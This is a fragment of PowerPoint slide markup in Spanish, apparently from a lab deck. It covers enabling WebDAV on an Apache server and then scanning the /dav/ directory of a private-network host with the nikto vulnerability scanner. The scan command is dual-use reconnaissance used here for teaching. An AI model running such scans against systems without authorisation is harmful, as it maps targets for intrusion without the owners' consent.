                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://www.scielo.sa.cr/pdf/aie/</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="FFFFFF"/>
              </a:highlight>
              <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pP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9" name="Imagen 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{04D63BBC-6229-5DAD-2099-D162FD476FA2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2139884" y="2816719"/>
            <a:ext cx="10052116" cy="1459935"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Rectángulo: esquinas redondeadas 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8B9379AF-E34C-0484-BDB0-DE47F5814CBE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7136091" y="3883843"/>
            <a:ext cx="5055909" cy="46191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3" name="Imagen 12">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F725F171-E3EA-EA8B-4704-3CA4CAEAF80F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2149953" y="4965679"/>
            <a:ext cx="9944637" cy="1121755"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectángulo: esquinas redondeadas 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4BB1EF8B-B8FC-2EE5-863A-295AA6A87DCF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8248454" y="5769204"/>
            <a:ext cx="3836709" cy="30582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8205806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744718" y="191958"/>
            <a:ext cx="8784976" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Conulta</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> DAV con - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>nikto</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="CuadroTexto 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{20073B26-D027-2C56-BFA9-461AD5FFEF20}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="695400" y="1147874"/>
            <a:ext cx="11169540" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="pt-BR" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>nikto</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t> -h http://192.168.1.103/dav/</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="282828"/>
              </a:solidFill>
              <a:latin typeface="Roboto-Regular"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Imagen 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5308D603-5B6A-A0C9-333C-9C43AAE2289C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3935760" y="1844824"/>
            <a:ext cx="5813833" cy="4583984"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="24523425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a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Configurar DAV en apache</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="CuadroTexto 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DAB95837-215B-8785-46E0-BD6215D310B0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="207390" y="887980"/>
            <a:ext cx="10404835" cy="6374181"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>Basado en el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>siguiente</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t> manual</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="282828"/>
              </a:solidFill>
              <a:latin typeface="Roboto-Regular"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>a2enmod </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>dav</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="282828"/>
              </a:solidFill>
              <a:latin typeface="Roboto-Regular"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>a2enmod </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>dav_fs</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="282828"/>
              </a:solidFill>
              <a:latin typeface="Roboto-Regular"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>mkdir</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t> /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>/www/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>webdav</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="282828"/>
              </a:solidFill>
              <a:latin typeface="Roboto-Regular"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>chown</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>www-data:www-data</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t> /var/www/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>webdav</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="282828"/>
              </a:solidFill>
              <a:latin typeface="Roboto-Regular"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>mkdir</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t> -p /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>usr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>/local/apache/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="282828"/>
              </a:solidFill>
              <a:latin typeface="Roboto-Regular"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>chown</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>www-data:www-data</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t> /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>usr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>/local/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>apache</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>/var</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="282828"/>
              </a:solidFill>
              <a:latin typeface="Roboto-Regular"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>vi /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>/apache2/sites-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>enabled</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>/000-default.conf</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="282828"/>
              </a:solidFill>
              <a:latin typeface="Roboto-Regular"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="282828"/>
              </a:solidFill>
              <a:latin typeface="Roboto-Regular"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>apachectl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>configtest</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="282828"/>
              </a:solidFill>
              <a:latin typeface="Roboto-Regular"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>service</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t> apache2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Roboto-Regular"/>
              </a:rPr>
              <a:t>restart</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="282828"/>
              </a:solidFill>
              <a:latin typeface="Roboto-Regular"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pP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8" name="Imagen 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2EF04EFA-87CC-4298-A33A-026084AD76E0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6692989" y="4194619"/>
            <a:ext cx="4820323" cy="2314898"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13803051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a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Configurar DAV en apache</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="CuadroTexto 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DAB95837-215B-8785-46E0-BD6215D310B0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-631596" y="824378"/>
            <a:ext cx="10404835" cy="4896853"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
